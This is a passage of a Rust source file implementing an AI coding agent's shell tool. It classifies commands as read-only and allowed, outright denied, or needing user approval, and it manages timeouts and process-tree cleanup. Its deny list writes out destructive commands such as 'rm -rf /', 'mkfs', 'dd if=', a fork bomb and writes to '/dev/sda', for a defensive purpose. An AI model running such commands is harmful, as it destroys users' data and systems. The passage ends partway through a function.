//! Command execution.
//!
//! This is the most powerful and the most dangerous tool of the registry. The approach is to
//! classify each command **from its actual text**, into three categories:
//!
//! - allowed without asking, for a closed set of read-only commands;
//! - denied outright, for a handful of patterns that no legitimate development session needs
//!   and whose effect is irreversible;
//! - subject to user approval for everything else - the default case, by design.
//!
//! This allowlist is not a sandbox: a shell remains a shell, and the only real guarantee comes
//! from the user's explicit approval. It exists to avoid interrupting them for a `git status`,
//! not to pretend to confine the agent.

use std::time::Duration;

use async_trait::async_trait;
use po_core::tool::Permission;
use po_core::{ToolOutcome, ToolSpec};
use serde_json::{Value, json};

use crate::{Tool, ToolContext, required_str};

const DEFAULT_TIMEOUT: Duration = Duration::from_secs(120);
const MAX_TIMEOUT: Duration = Duration::from_secs(600);

/// Read-only commands, run without interrupting the user.
/// Compared on the first word, and on the first two for subcommands.
const READ_ONLY: &[&str] = &[
    "ls", "dir", "pwd", "cat", "head", "tail", "wc", "file", "stat", "which", "where", "type",
    "echo", "printf", "date", "uptime", "uname", "whoami", "id", "hostname", "ps", "tasklist",
    "find", "grep", "rg", "ag", "fd", "tree", "du", "df", "env", "printenv", "sort", "uniq",
    "diff", "cmp", "comm", "cut", "tr", "column", "fold", "paste", "nl", "sd", "awk", "sed",
    "jq", "yq", "fx", "gron", "curl", "wget", "less", "more", "bat",
];

const READ_ONLY_SUBCOMMANDS: &[(&str, &str)] = &[
    ("git", "status"), ("git", "log"), ("git", "diff"), ("git", "show"),
    ("git", "branch"), ("git", "remote"), ("git", "blame"),
    ("git", "tag"), ("git", "stash"),
    ("git", "rev-list"), ("git", "merge-base"), ("git", "for-each-ref"),
    ("git", "ls-remote"), ("git", "rev-parse"), ("git", "cat-file"),
    ("git", "describe"), ("git", "shortlog"), ("git", "ls-files"),
    ("git", "ls-tree"), ("git", "name-rev"), ("git", "check-ref-format"),
    ("git", "check-ignore"), ("git", "var"), ("git", "show-ref"), ("git", "show-branch"),
    ("git", "config"),
    ("gh", "pr"), ("gh", "issue"), ("gh", "repo"), ("gh", "release"),
    ("gh", "run"), ("gh", "workflow"), ("gh", "search"), ("gh", "auth"),
    ("gh", "api"), ("gh", "status"), ("gh", "ruleset"), ("gh", "cache"),
    ("cargo", "check"), ("cargo", "tree"), ("cargo", "metadata"),
    ("cargo", "verify-project"), ("cargo", "read-manifest"), ("cargo", "locate-project"),
    ("npm", "list"), ("npm", "ls"), ("npm", "view"), ("npm", "info"),
    ("npm", "outdated"), ("npm", "audit"), ("npm", "why"), ("npm", "explain"),
    ("pnpm", "list"), ("pnpm", "ls"), ("pnpm", "view"), ("pnpm", "info"),
    ("pnpm", "outdated"), ("pnpm", "audit"), ("pnpm", "why"),
    ("yarn", "list"), ("yarn", "info"), ("yarn", "audit"), ("yarn", "why"),
    ("pip", "list"), ("pip", "show"), ("pip", "check"),
    ("poetry", "show"), ("poetry", "check"),
    ("go", "list"), ("go", "vet"), ("go", "version"),
];

/// Patterns denied without asking. Each one is an irreversible operation that reaches far
/// beyond the workspace - denying costs a round trip, accepting by mistake costs the machine.
const FORBIDDEN: &[(&str, &str)] = &[
    ("rm -rf /", "recursive deletion of the system root"),
    ("rm -rf /*", "recursive deletion of the system root"),
    ("mkfs", "filesystem formatting"),
    ("dd if=", "low-level disk write"),
    (":(){", "fork bomb"),
    ("chmod -R 777 /", "opening permissions on the whole system"),
    ("> /dev/sda", "direct write to a block device"),
];

/// Programs denied when they are the command run, not when they are merely named:
/// `grep -rn shutdown src` looks for a function, it stops nothing.
const FORBIDDEN_PROGRAMS: &[(&str, &str)] = &[
    ("shutdown", "machine shutdown"),
    ("reboot", "machine reboot"),
    ("poweroff", "machine shutdown"),
    ("halt", "machine shutdown"),
    ("stop-computer", "machine shutdown"),
    ("restart-computer", "machine reboot"),
];

pub struct BashTool;

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "bash"
    }

    fn spec(&self) -> ToolSpec {
        ToolSpec::new(
            "bash",
            // The real shell is announced: a model told "bash" writes bash, and on Windows
            // `cmd.exe` rejected each of its commands (measured: three to four failures per
            // task before this change).
            format!(
                "Runs a command from the workspace root, with {}. Standard output and standard \
                 error are returned together.",
                detected_shell().description
            ),
            json!({
                "type": "object",
                "properties": {
                    "command": {"type": "string"},
                    "timeout_seconds": {"type": "integer", "description": "120 by default, 600 at most"}
                },
                "required": ["command"]
            }),
        )
    }

    fn permission(&self, input: &Value) -> Permission {
        match input.get("command").and_then(Value::as_str) {
            Some(command) => classify(command),
            // A missing command will be rejected at execution anyway; we do not bother the
            // user over a malformed call.
            None => Permission::Deny,
        }
    }

    async fn run(&self, id: &str, input: Value, ctx: &ToolContext) -> ToolOutcome {
        let command = match required_str(&input, "command") {
            Ok(value) => value,
            Err(err) => return ToolOutcome::error(id, err),
        };
        if let Some(reason) = forbidden_reason(command) {
            return ToolOutcome::error(id, format!("command refused - {reason}"));
        }

        let timeout = input
            .get("timeout_seconds")
            .and_then(Value::as_u64)
            .map(Duration::from_secs)
            .unwrap_or(DEFAULT_TIMEOUT)
            .min(MAX_TIMEOUT);

        let mut process = shell_command(command);
        process
            .current_dir(ctx.workspace.root())
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .kill_on_drop(true);
        #[cfg(unix)]
        process.process_group(0);

        let started = std::time::Instant::now();
        let mut child = match process.spawn() {
            Ok(child) => child,
            Err(err) => return ToolOutcome::error(id, format!("cannot execute: {err}")),
        };
        // Declared after the child, so dropped before it: on a timeout or an interrupted turn,
        // what the shell started goes too, not just the shell.
        let mut tree = TreeGuard::new(&child);
        let (stdout_pipe, stderr_pipe) = (child.stdout.take(), child.stderr.take());
        let run = async {
            use tokio::io::AsyncReadExt;
            let (mut stdout, mut stderr) = (Vec::new(), Vec::new());
            let read_out = async {
                if let Some(mut pipe) = stdout_pipe {
                    let _ = pipe.read_to_end(&mut stdout).await;
                }
            };
            let read_err = async {
                if let Some(mut pipe) = stderr_pipe {
                    let _ = pipe.read_to_end(&mut stderr).await;
                }
            };
            let (status, (), ()) = tokio::join!(child.wait(), read_out, read_err);
            status.map(|status| std::process::Output { status, stdout, stderr })
        };
        let output = match tokio::time::timeout(timeout, run).await {
            Ok(Ok(output)) => {
                tree.disarm();
                output
            }
            Ok(Err(err)) => return ToolOutcome::error(id, format!("cannot execute: {err}")),
            Err(_) => {
                return ToolOutcome::error(
                    id,
                    format!(
                        "command interrupted after {} s - rerun it with a longer timeout or in the \
                         background",
                        timeout.as_secs()
                    ),
                );
            }
        };

        let elapsed = started.elapsed();
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        let code = output.status.code().unwrap_or(-1);

        // Both streams are returned together: many tools write their diagnostics to stderr
        // while succeeding, and separating them would deprive the model of context.
        let mut body = String::new();
        if !stdout.trim().is_empty() {
            body.push_str(&stdout);
        }
        if !stderr.trim().is_empty() {
            if !body.is_empty() {
                body.push('\n');
            }
            body.push_str(&stderr);
        }
        if body.trim().is_empty() {
            body = "(no output)".into();
        }

        let display = po_i18n::t!(
            "tools.bash.display",
            command = first_line(command),
            code = code,
            secs = format!("{:.1}", elapsed.as_secs_f32())
        );
        if output.status.success() {
            ToolOutcome::ok(id, ctx.clamp(&body)).with_display(display)
        } else {
            // A non-zero exit code is information, not a harness failure: the model must read
            // it to fix its command.
            ToolOutcome::error(id, ctx.clamp(&format!("exit code {code}\n\n{body}")))
                .with_display(display)
        }
    }
}

/// Stops a command's whole process tree when dropped before it ended. Killing the shell alone
/// left what it had started running (measured with Git Bash: `sleep` survived its `bash`), a
/// `cargo test` then kept its lock on `target`.
///
/// On Windows, the tree is a job object: every process the shell starts enters it, even through
/// Git Bash's emulated `fork`, which breaks the parent links `taskkill /T` follows (measured:
/// `sleep` survived it). On Unix, the command has its own process group.
struct TreeGuard {
    armed: bool,
    #[cfg(windows)]
    job: Option<job::Job>,
    #[cfg(unix)]
    pid: Option<u32>,
}

impl TreeGuard {
    fn new(child: &tokio::process::Child) -> Self {
        #[cfg(windows)]
        {
            let job = job::Job::new().filter(|job| child.raw_handle().is_some_and(|handle| job.assign(handle)));
            Self { armed: true, job }
        }
        #[cfg(unix)]
        {
            Self { armed: true, pid: child.id() }
        }
    }

    /// The command ended on its own: what it left running in the background stays.
    fn disarm(&mut self) {
        self.armed = false;
        #[cfg(windows)]
        if let Some(job) = &self.job {
            job.release();
        }
    }
}

impl Drop for TreeGuard {
    fn drop(&mut self) {
        if !self.armed {
            return;
        }
        #[cfg(windows)]
        if let Some(job) = &self.job {
            job.kill();
        }
        #[cfg(unix)]
        if let Some(pid) = self.pid {
            // The minus sign reaches the whole process group.
            let _ = std::process::Command::new("kill")
                .args(["-KILL", &format!("-{pid}")])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status();
        }
    }
}

#[cfg(windows)]
mod job {
    use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
    use windows_sys::Win32::System::JobObjects::{
        AssignProcessToJobObject, CreateJobObjectW, JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE, JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
        JobObjectExtendedLimitInformation, SetInformationJobObject, TerminateJobObject,
    };

    pub struct Job(HANDLE);

    // SAFETY: a job handle can be used and closed from any thread.
    unsafe impl Send for Job {}
    unsafe impl Sync for Job {}

    impl Job {
        pub fn new() -> Option<Self> {
            // SAFETY: an anonymous job with default security; the handle is checked.
            let handle = unsafe { CreateJobObjectW(std::ptr::null(), std::ptr::null()) };
            if handle.is_null() {
                return None;
            }
            let job = Job(handle);
            job.limit(JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE);
            Some(job)
        }

        fn limit(&self, flags: u32) {
            // SAFETY: a zeroed structure is a valid "no limit", only the flags are set.
            unsafe {
                let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
                info.BasicLimitInformation.LimitFlags = flags;
                SetInformationJobObject(
                    self.0,
                    JobObjectExtendedLimitInformation,
                    (&raw const info).cast(),
                    std::mem::size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32,
                );
            }
        }

        pub fn assign(&self, process: std::os::windows::io::RawHandle) -> bool {
            // SAFETY: both handles are alive: the job here, the process held by its `Child`.
            unsafe { AssignProcessToJobObject(self.0, process as HANDLE) != 0 }
        }

        /// Closing the job will no longer stop its processes.
        pub fn release(&self) {
            self.limit(0);
        }

        pub fn kill(&self) {
            // SAFETY: the handle is alive until drop.
            unsafe { TerminateJobObject(self.0, 1) };
        }
    }

    impl Drop for Job {
        fn drop(&mut self) {
            // SAFETY: the handle was created by `new` and is closed once.
            unsafe { CloseHandle(self.0) };
        }
    }
}

fn first_line(command: &str) -> &str {
    command.lines().next().unwrap_or(command)
}

/// Shell that runs the tool's commands, chosen once for the whole session: the tool description
/// depends on it, and it must stay stable so that the server can reuse the cached prompt.
#[derive(Debug, Clone)]
pub struct Shell {
    pub program: std::path::PathBuf,
    pub args: &'static [&'static str],
    /// What the model reads in the tool description.
    pub description: &'static str,
}

pub fn detected_shell() -> &'static Shell {
    static SHELL: std::sync::OnceLock<Shell> = std::sync::OnceLock::new();
    SHELL.get_or_init(detect_shell)
}

fn detect_shell() -> Shell {
    // An explicit choice wins: `PO_SHELL=path/to/bash`.
    if let Some(path) = std::env::var_os("PO_SHELL").filter(|p| !p.is_empty()) {
        let path = std::path::PathBuf::from(path);
        let name = path.file_stem().and_then(|s| s.to_str()).unwrap_or("").to_ascii_lowercase();
        return match name.as_str() {
            "pwsh" | "powershell" => powershell(path),
            "cmd" => cmd(),
            _ => posix(path, "bash"),
        };
    }
    platform_shell()
}

fn posix(program: std::path::PathBuf, _name: &str) -> Shell {
    Shell { program, args: &["-c"], description: "bash (POSIX syntax)" }
}

#[cfg(windows)]
fn powershell(program: std::path::PathBuf) -> Shell {
    Shell {
        program,
        args: &["-NoProfile", "-NonInteractive", "-Command"],
        description: "PowerShell on Windows (PowerShell syntax, not bash)",
    }
}

#[cfg(windows)]
fn cmd() -> Shell {
    Shell {
        program: "cmd".into(),
        args: &["/C"],
        description: "cmd.exe on Windows (cmd syntax: double quotes only, `&&` to chain)",
    }
}

#[cfg(not(windows))]
fn powershell(program: std::path::PathBuf) -> Shell {
    Shell { program, args: &["-NoProfile", "-NonInteractive", "-Command"], description: "PowerShell" }
}

#[cfg(not(windows))]
fn cmd() -> Shell {
    posix("sh".into(), "sh")
}

#[cfg(not(windows))]
fn platform_shell() -> Shell {
    Shell { program: "sh".into(), args: &["-c"], description: "sh (POSIX syntax)" }
}

/// On Windows, the order of preference follows what models know how to write: bash above all.
/// Git Bash is present on most development machines; PowerShell next; `cmd.exe` as a last
/// resort, because it is always there.
#[cfg(windows)]
fn platform_shell() -> Shell {
    if let Some(bash) = find_git_bash() {
        return Shell {
            program: bash,
            args: &["-c"],
            description: "bash (Git Bash on Windows: POSIX syntax, paths /c/… or C:/…)",
        };
    }
    for name in ["pwsh", "powershell"] {
        if let Some(path) = find_on_path(&format!("{name}.exe")) {
            return powershell(path);
        }
    }
    cmd()
}

#[cfg(windows)]
fn find_on_path(file: &str) -> Option<std::path::PathBuf> {
    let path = std::env::var_os("PATH")?;
    std::env::split_paths(&path).map(|dir| dir.join(file)).find(|candidate| candidate.is_file())
}

/// Looks for the `bash.exe` of Git for Windows. The one in `System32` is excluded: it is the WSL
/// launcher, which would run the command in another machine, with other paths.
#[cfg(windows)]
fn find_git_bash() -> Option<std::path::PathBuf> {
    let mut candidates = Vec::new();
    if let Some(git) = find_on_path("git.exe") {
        // `...\Git\cmd\git.exe`, `...\Git\bin\git.exe` or `...\Git\mingw64\bin\git.exe`.
        for ancestor in git.ancestors().skip(1).take(3) {
            candidates.push(ancestor.join("bin").join("bash.exe"));
        }
    }
    for var in ["ProgramFiles", "ProgramW6432", "LOCALAPPDATA"] {
        if let Some(base) = std::env::var_os(var) {
            let base = std::path::PathBuf::from(base);
            candidates.push(base.join("Git").join("bin").join("bash.exe"));
            candidates.push(base.join("Programs").join("Git").join("bin").join("bash.exe"));
        }
    }
    candidates.into_iter().find(|candidate| {
        let text = candidate.to_string_lossy().to_ascii_lowercase();
        candidate.is_file() && !text.contains("system32") && !text.contains("windowsapps")
    })
}

fn shell_command(command: &str) -> tokio::process::Command {
    let shell = detected_shell();
    let mut process = tokio::process::Command::new(&shell.program);
    process.args(shell.args).arg(command);
    #[cfg(windows)]
    {
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        process.creation_flags(CREATE_NO_WINDOW);
    }
    process
}

fn strip_benign_redirections(cmd: &str) -> String {
    const BENIGN: &[&str] = &[
        "2>/dev/null", "2> /dev/null", "2>/dev/zero", "2> /dev/zero", "2>&1", "2>& 1",
    ];
    // Bytes in, bytes out: only ASCII is matched or replaced, so the text stays valid UTF-8 and
    // an accented letter is never cut (slicing `cmd` at a byte index inside one panicked).
    let mut result: Vec<u8> = Vec::with_capacity(cmd.len());
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut escaped = false;
    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        if escaped {
            escaped = false;
            result.push(b);
            i += 1;
            continue;
        }
        if b == b'\\' && !in_single_quote {
            escaped = true;
            result.push(b'\\');
            i += 1;
            continue;
        }
        if b == b'\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
            result.push(b'\'');
            i += 1;
            continue;
        }
        if b == b'"' && !in_single_quote {
            in_double_quote = !in_double_quote;
            result.push(b'"');
            i += 1;
            continue;
        }
        if !in_single_quote && !in_double_quote {
            let rest = &bytes[i..];
            let mut matched = false;
            for pattern in BENIGN {
                if rest.starts_with(pattern.as_bytes()) {
                    result.push(b' ');
                    i += pattern.len();
                    matched = true;
                    break;
                }
            }
            if matched {
                continue;
            }
        }
        result.push(b);
        i += 1;
    }
    String::from_utf8(result).unwrap_or_else(|_| cmd.to_owned())
}

fn split_compound_command(cmd: &str) -> Option<Vec<&str>> {
    let mut segments = Vec::new();
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut escaped = false;
    let mut start = 0;
    let bytes = cmd.as_bytes();
    let len = bytes.len();
    let mut i = 0;

    while i < len {
        let b = bytes[i];
        if escaped {
            escaped = false;
            i += 1;
            continue;
        }
        if b == b'\\' && !in_single_quote {
            escaped = true;
            i += 1;
            continue;
        }
        if b == b'\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
            i += 1;
            continue;
        }
        if b == b'"' && !in_single_quote {
            in_double_quote = !in_double_quote;
            i += 1;
            continue;
        }

        if !in_single_quote && !in_double_quote {
            if b == b'`' {
                return None;
            }
            if b == b'$' && i + 1 < len && bytes[i + 1] == b'(' {
                return None;
            }
            if (b == b'<' || b == b'>') && i + 1 < len && bytes[i + 1] == b'(' {
                return None;
            }

            if b == b'>' || b == b'<' {
                let rest = &cmd[i..];
                let benign = b == b'>'
                    && i > 0
                    && bytes[i - 1] == b'2'
                    && (rest.starts_with(">/dev/null")
                        || rest.starts_with("> /dev/null")
                        || rest.starts_with(">/dev/zero")
                        || rest.starts_with("> /dev/zero")
                        || rest.starts_with(">&1")
                        || rest.starts_with(">& 1"));
                if !benign {
                    return None;
                }
            }

            if b == b';' || b == b'\n' || b == b'\r' {
                let seg = cmd[start..i].trim();
                if !seg.is_empty() {
                    segments.push(seg);
                }
                i += 1;
                start = i;
                continue;
            } else if b == b'&' {
                if i + 1 < len && bytes[i + 1] == b'&' {
                    let seg = cmd[start..i].trim();
                    if !seg.is_empty() {
                        segments.push(seg);
                    }
                    i += 2;
                    start = i;
                    continue;
                } else if i > 0 && bytes[i - 1] == b'>' {
                    i += 1;
                    continue;
                } else {
                    return None;
                }
            } else if b == b'|' {
                if i + 1 < len && bytes[i + 1] == b'|' {
                    let seg = cmd[start..i].trim();
                    if !seg.is_empty() {
                        segments.push(seg);
                    }
                    i += 2;
                    start = i;
                    continue;
                } else {
                    let seg = cmd[start..i].trim();
                    if !seg.is_empty() {
                        segments.push(seg);
                    }
                    i += 1;
                    start = i;
                    continue;
                }
            }
        }
        i += 1;
    }

    if in_single_quote || in_double_quote {
        return None;
    }

    let last = cmd[start..].trim();
    if !last.is_empty() {
        segments.push(last);
    }

    Some(segments)
}

fn has_unquoted_meta(cmd: &str) -> bool {
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut escaped = false;
    let bytes = cmd.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    while i < len {
        let b = bytes[i];
        if escaped {
            escaped = false;
            i += 1;
            continue;
        }
        if b == b'\\' && !in_single_quote {
            escaped = true;
            i += 1;
            continue;
        }
        if b == b'\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
            i += 1;
            continue;
        }
        if b == b'"' && !in_single_quote {
            in_double_quote = !in_double_quote;
            i += 1;
            continue;
        }
        if !in_single_quote && !in_double_quote {
            if matches!(b, b'&' | b'|' | b';' | b'>' | b'<' | b'`' | b'\n' | b'\r') {
                return true;
            }
            if b == b'$' && i + 1 < len && bytes[i + 1] == b'(' {
                return true;
            }
        }
        i += 1;
    }
    false
}

fn split_words(cmd: &str) -> Option<Vec<String>> {
    let mut words = Vec::new();
    let mut current = String::new();
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut escaped = false;
    let mut in_token = false;

    for b in cmd.bytes() {
        if escaped {
            current.push(b as char);
            escaped = false;
            in_token = true;
            continue;
        }
        if b == b'\\' && !in_single_quote {
            escaped = true;
            in_token = true;
            continue;
        }
        if b == b'\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
            in_token = true;
            continue;
        }
        if b == b'"' && !in_single_quote {
            in_double_quote = !in_double_quote;
            in_token = true;
            continue;
        }
        if (b == b' ' || b == b'\t' || b == b'\n' || b == b'\r') && !in_single_quote && !in_double_quote {
            if in_token {
                words.push(current);
                current = String::new();
                in_token = false;
            }
            continue;
        }
        current.push(b as char);
        in_token = true;
    }

    if in_single_quote || in_double_quote {
        return None;
    }
    if in_token {
        words.push(current);
    }
    Some(words)
}

fn classify_single(command: &str) -> Permission {
    let normalized = command.trim();
    if normalized.is_empty() {
        return Permission::Deny;
    }
    if forbidden_reason(normalized).is_some() {
        return Permission::Deny;
    }

    let cleaned = strip_benign_redirections(normalized);
    let trimmed = cleaned.trim();

    // Any remaining unquoted chain, redirection, or substitution requires confirmation.
    if has_unquoted_meta(trimmed) {
        return Permission::Ask;
    }

    let Some(words) = split_words(trimmed) else {
        return Permission::Ask;
    };
    let Some((program, args)) = words.split_first() else {
        return Permission::Deny;
    };
    let program = program.rsplit(['/', '\\']).next().unwrap_or(program);
    let arg_strs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
    let args = arg_strs.as_slice();

    // Pure information queries (--version, --help) on any binary are safe
    if matches!(args, &["--version"] | &["-V"] | &["--help"] | &["-h"] | &["-v"]) {
        return Permission::Allow;
    }

    // `git -c core.pager=<anything> log` runs that anything: a configuration given on the
    // command line, or another git, turns any reading subcommand into a command run.
    if program == "git" && git_global_options_run(args) {
        return Permission::Ask;
    }
    if READ_ONLY.contains(&program) && !writes_or_runs(program, args) {
        return Permission::Allow;
    }
    if let Some((subcommand, rest)) = find_subcommand(program, args)
        && READ_ONLY_SUBCOMMANDS.contains(&(program, subcommand))
        && !subcommand_writes(program, subcommand, rest)
    {
        return Permission::Allow;
    }
    Permission::Ask
}

fn find_subcommand<'a>(program: &str, args: &'a [&'a str]) -> Option<(&'a str, &'a [&'a str])> {
    let mut i = 0;
    while i < args.len() {
        let arg = args[i];
        if arg.starts_with('-') {
            let takes_value = match program {
                "git" => matches!(arg, "-C" | "-c" | "--git-dir" | "--work-tree"),
                "gh" => matches!(arg, "-R" | "--repo"),
                _ => false,
            };
            if takes_value && i + 1 < args.len() {
                i += 2;
            } else {
                i += 1;
            }
        } else {
            return Some((arg, &args[i + 1..]));
        }
    }
    None
}

fn subcommand_writes(program: &str, subcommand: &str, args: &[&str]) -> bool {
    match program {
        "git" => git_writes(subcommand, args),
        "gh" => gh_writes(subcommand, args),
        // `npm audit fix` rewrites the lock file and node_modules.
        "npm" | "pnpm" | "yarn" => subcommand == "audit" && args.iter().any(|a| *a == "fix" || a.starts_with("--fix")),
        _ => false,
    }
}

/// The options given to git before its subcommand that make it run another program:
/// `-c core.pager=…`, `-c alias.x=!…`, `--config-env`, `--exec-path=…`.
fn git_global_options_run(args: &[&str]) -> bool {
    for arg in args {
        if !arg.starts_with('-') {
            return false;
        }
        if *arg == "-c" || arg.starts_with("--config-env") || arg.starts_with("--exec-path=") {
            return true;
        }
    }
    false
}

/// The arguments that are not options: the script of `sed` or `awk`, the files.
fn positionals<'a>(args: &[&'a str]) -> Vec<&'a str> {
    args.iter().copied().filter(|a| !a.starts_with('-')).collect()
}

/// A sed script that writes a file (`w file`, `s/a/b/w file`) or runs a command (`e`, `s///e`).
/// Looks for the command letter in a command position; a false alarm only asks the user.
fn sed_script_writes(script: &str) -> bool {
    let chars: Vec<char> = script.chars().collect();
    chars.iter().enumerate().any(|(i, c)| {
        if !matches!(c, 'w' | 'W' | 'e') {
            return false;
        }
        let before = if i == 0 { None } else { Some(chars[i - 1]) };
        let after = chars.get(i + 1);
        let command_position = before.is_none_or(|b| {
            b.is_ascii_digit() || b.is_whitespace() || matches!(b, '/' | ';' | '{' | '}' | '$' | 'g' | 'p' | 'i' | 'I' | 'm' | 'M')
        });
        command_position && after.is_none_or(|a| a.is_whitespace() || matches!(a, ';' | '}'))
    })
}

/// Checks if a command is statically guaranteed to be mutating (file writes, git commits,
/// process killing, package installations, etc.).
/// When false, the command is either a read or an unknown/generic command that may be verified dynamically.
pub fn is_statically_mutating(command: &str) -> bool {
    let normalized = command.trim();
    if normalized.is_empty() {
        return true;
    }
    if forbidden_reason(normalized).is_some() {
        return true;
    }

    let cleaned = strip_benign_redirections(normalized);
    if has_unquoted_write_redirection(&cleaned) {
        return true;
    }

    if let Some(segments) = split_compound_command(normalized) {
        for segment in segments {
            if is_single_statically_mutating(segment) {
                return true;
            }
        }
        return false;
    }

    is_single_statically_mutating(normalized)
}

fn has_unquoted_write_redirection(cmd: &str) -> bool {
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut escaped = false;
    for b in cmd.bytes() {
        if escaped {
            escaped = false;
            continue;
        }
        if b == b'\\' && !in_single_quote {
            escaped = true;
            continue;
        }
        if b == b'\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
            continue;
        }
        if b == b'"' && !in_single_quote {
            in_double_quote = !in_double_quote;
            continue;
        }
        if !in_single_quote && !in_double_quote && b == b'>' {
            return true;
        }
    }
    false
}

fn is_single_statically_mutating(command: &str) -> bool {
    let normalized = command.trim();
    if normalized.is_empty() {
        return true;
    }
    let cleaned = strip_benign_redirections(normalized);
    let trimmed = cleaned.trim();
    let Some(words) = split_words(trimmed) else {
        return true;
    };
    let Some((program, args)) = words.split_first() else {
        return true;
    };
    let program = program.rsplit(['/', '\\']).next().unwrap_or(program);
    let arg_strs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();

    const MUTATING_PROGRAMS: &[&str] = &[
        "rm", "del", "erase", "rmdir", "rd", "mkdir", "md", "mv", "move", "cp", "copy",
        "touch", "chmod", "chown", "chgrp", "truncate", "ln", "mklink", "install", "unlink",
        "kill", "pkill", "taskkill", "reboot", "shutdown", "poweroff", "halt",
        "stop-computer", "restart-computer",
    ];

    if MUTATING_PROGRAMS.contains(&program) {
        return true;
    }

    match program {
        "git" => {
            if let Some((subcommand, rest)) = find_subcommand(program, &arg_strs) {
                const MUTATING_GIT: &[&str] = &[
                    "commit", "push", "merge", "rebase", "pull", "checkout", "switch",
                    "restore", "reset", "cherry-pick", "revert", "clean", "apply",
                    "init", "clone",
                ];
                if MUTATING_GIT.contains(&subcommand) {
                    return true;
                }
                git_writes(subcommand, rest)
            } else {
                false
            }
        }
        "gh" => {
            if let Some((subcommand, rest)) = find_subcommand(program, &arg_strs) {
                gh_writes(subcommand, rest)
            } else {
                false
            }
        }
        "npm" | "pnpm" | "yarn" => {
            matches!(arg_strs.first().copied(), Some("install" | "i" | "add" | "update" | "upgrade" | "remove" | "uninstall" | "rm" | "publish" | "init"))
        }
        "cargo" => {
            matches!(arg_strs.first().copied(), Some("build" | "run" | "add" | "rm" | "remove" | "update" | "install" | "uninstall" | "publish" | "init" | "new"))
        }
        "pip" => {
            matches!(arg_strs.first().copied(), Some("install" | "uninstall"))
        }
        "sed" => {
            writes_or_runs("sed", &arg_strs)
        }
        "awk" => {
            writes_or_runs("awk", &arg_strs)
        }
        "sd" => {
            writes_or_runs("sd", &arg_strs)
        }
        _ => false,
    }
}

/// Classifies a command. A pure function, exhaustively tested: it decides when the user is
/// interrupted and when they are not.
pub fn classify(command: &str) -> Permission {
    let normalized = command.trim();
    if normalized.is_empty() {
        return Permission::Deny;
    }
    if forbidden_reason(normalized).is_some() {
        return Permission::Deny;
    }

    if let Some(segments) = split_compound_command(normalized) {
        if segments.is_empty() {
            return Permission::Deny;
        }
        let mut overall = Permission::Allow;
        for segment in segments {
            match classify_single(segment) {
                Permission::Deny => return Permission::Deny,
                Permission::Ask => overall = Permission::Ask,
                Permission::Allow => {}
            }
        }
        return overall;
    }

    classify_single(normalized)
}

/// The options that turn a reading command into one that writes, deletes or runs another
/// (`find -delete`, `fd -x`, `rg --pre`, `sort -o`): the user is asked then. `env` followed by
/// anything runs it.
fn writes_or_runs(program: &str, args: &[&str]) -> bool {
    let has = |options: &[&str]| args.iter().any(|a| options.iter().any(|o| a == o || a.starts_with(&format!("{o}="))));
    match program {
        "env" => !args.is_empty(),
        "find" => has(&["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0", "-fprintf", "-fls"]),
        "fd" => has(&["-x", "--exec", "-X", "--exec-batch"]),
        "rg" => has(&["--pre"]),
        "sort" => has(&["-o", "--output"]) || args.iter().any(|a| a.starts_with("-o") && !a.starts_with("--")),
        "tree" => has(&["-o"]),
        "date" => has(&["-s", "--set"]),
        "curl" => curl_writes(args),
        // wget saves what it fetches unless told to print it (`-O -`) or only to check (`--spider`).
        "wget" => {
            let to_stdout = args.windows(2).any(|w| w[0] == "-O" && w[1] == "-")
                || args.iter().any(|a| matches!(*a, "-O-" | "-qO-" | "--output-document=-"));
            has(&["--post-data", "--post-file", "-o", "--output-file", "-a", "--append-output"])
                || !(to_stdout || has(&["--spider"]))
        }
        "sed" => {
            has(&["-i", "--in-place", "-f", "--file"])
                || args.iter().any(|a| (a.starts_with("-i") || a.starts_with("-f")) && !a.starts_with("--"))
                || positionals(args).iter().any(|s| sed_script_writes(s))
        }
        // awk writes with `print > "f"`, runs with `system()`, `| "cmd"`, `"cmd" | getline`.
        "awk" | "gawk" => {
            has(&["-i", "--include", "-f", "--file", "-E", "--exec", "-l", "--load"])
                || positionals(args).iter().any(|s| s.contains("system") || s.contains('>') || s.contains('|') || s.contains("getline"))
        }
        // sd rewrites the files it is given in place, unless it only previews.
        "sd" => !has(&["-p", "--preview"]) && positionals(args).len() > 2,
        "yq" => has(&["-i", "--inplace"]),
        _ => false,
    }
}

/// `git branch` and `git remote` also create, rename and delete; `--output` writes a file.
fn git_writes(subcommand: &str, args: &[&str]) -> bool {
    if args.iter().any(|a| a.starts_with("--output")) {
        return true;
    }
    match subcommand {
        // Listing only: options, none of those that change something.
        "branch" => {
            let mutates = args.iter().any(|a| {
                matches!(
                    *a,
                    "-d" | "-D" | "-m" | "-M" | "-c" | "-C" | "-f" | "-u" | "--delete" | "--move" | "--copy" | "--force"
                        | "--unset-upstream" | "--edit-description"
                ) || a.starts_with("--set-upstream")
            });
            if mutates {
                return true;
            }
